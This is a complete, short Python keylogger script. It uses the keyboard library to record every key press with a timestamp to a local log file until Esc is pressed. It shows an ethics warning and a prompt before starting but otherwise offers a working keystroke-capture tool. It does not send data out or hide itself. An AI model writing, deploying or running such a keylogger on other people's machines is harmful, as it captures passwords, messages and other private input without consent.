import keyboard  # Require to install the `keyboard` library
import time
from datetime import datetime

# File to save the logged keystrokes
LOG_FILE = "keystrokes.log"

def on_key_press(event):
    """
    Callback function triggered whenever a key is pressed.
    """
    key = event.name
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Log the key and timestamp
    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} - Key Pressed: {key}\n")

def start_keylogger():
    """
    Starts the keylogger and logs keystrokes to a file.
    """
    print("Keylogger started. Press 'Esc' to stop.")

    # Set up the key press event listener
    keyboard.on_press(on_key_press)

    # Keep the program running until the user presses the 'Esc' key
    keyboard.wait("esc")

    print("Keylogger stopped. Keystrokes saved to 'keystrokes.log'.")

if __name__ == "__main__":
    # Ensure the user understands the ethical implications
    print("WARNING: This is a keylogger program. Use it only in ethical and legal contexts.")
    print("You must have explicit permission to use this on any system.")
    input("Press Enter to continue...")

    # Start the keylogger
    start_keylogger()